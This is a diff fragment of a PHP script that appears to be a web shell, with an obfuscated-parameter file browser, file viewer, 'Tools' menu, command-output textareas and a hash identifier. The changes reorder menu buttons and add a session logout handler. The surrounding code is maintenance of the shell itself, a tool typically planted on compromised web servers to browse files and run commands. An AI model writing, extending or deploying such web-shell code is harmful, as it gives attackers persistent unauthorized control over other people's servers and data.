@@ -506,9 +506,9 @@ echo '<button type="button" onclick=location.href="?path='.$serlok.'&'.net("uplo
 
 <button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("about").'=opet" style="float: right;"><i class="fa fa-info"></i> About</button>
 
-<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("logout").'=opet"><i class="fa fa-wrench" style="color:#A7DBDF;"></i> Tools</button>
-
 <button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("tool").'=opet"><i class="fa fa-wrench" style="color:#A7DBDF;"></i> Tools</button>
+
+<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("logout").'=opet"><i class="fa fa-wrench" style="color:#A7DBDF;"></i> Tools</button>
 
 </td></tr></div>
 </div></div></td></table></table><br>';
@@ -531,7 +531,8 @@ echo '</td></thead></table><br>';
         session_start();
         session_destroy();
         echo '<script>window.location="'.$_SERVER['SCRIPT_NAME'].'";</script>';
-}
+    }
+
 if (isset($_GET['viewfile'])) {
     $files = basename($_GET['viewfile']);
     echo "<table class='directory-listing-table'><td><center>Filename : <font color='orange'>$files</font>";
@@ -998,6 +999,14 @@ echo'<br>:: OutPut ::<br><textarea style="width:77%;height:300px ">'.$s.'</texta
         $rx = htmlspecialchars($r);
             echo'<br>:: OutPut::<br><textarea style="width:77%;height:300px" >'.$rx.'</textarea>';
 }
+}
+elseif ($_GET[net('logout')]=="opet") {
+    session_destroy();
+    echo'<script>
+    alert("bye.. !!!!!!!!");
+    window.location.href="?";
+    </script>';
+
 }elseif ($_GET[net('hashiden')] == "opet") {
  echo "<table class='directory-listing-table'><td>
 <h5>Hash Identifier</h5>Identify and detect unknown hashes using this tool.<hr>
